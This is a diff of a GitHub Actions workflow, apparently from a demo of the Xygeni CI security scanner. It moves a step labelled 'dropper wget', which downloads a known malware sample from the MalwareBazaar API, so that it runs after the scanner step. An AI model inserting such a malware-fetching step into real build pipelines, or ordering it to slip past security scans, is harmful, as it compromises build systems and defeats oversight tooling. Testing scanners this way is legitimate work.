@@ -16,23 +16,14 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: dropper wget
-        run: |
-          wget https://mb-api.abuse.ch/api/v1/ \
-            --post-data="query=get_file&sha256_hash=094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d"
-
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: Build with Maven
-        run: mvn clean install -DskipTests
-        working-directory: user-profile-app
+      - name: Checkout repository
+        uses: actions/checkout@v4
       
       - name: Xygeni-Scanner
         uses: xygeni/xygeni-action@v3.2.0
@@ -48,6 +39,15 @@ jobs:
           command: scan --skip=codetamper,compliance --send-to github/status --audit-project
           # Only Scan
           # command: -cop commitResolution:auto scan --send-to github/status --never-fail
+
+      - name: dropper wget
+        run: |
+          wget https://mb-api.abuse.ch/api/v1/ \
+            --post-data="query=get_file&sha256_hash=094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d"
+
+      - name: Build with Maven
+        run: mvn clean install -DskipTests
+        working-directory: user-profile-app
 
       - name: Archive WAR file
         if: success()
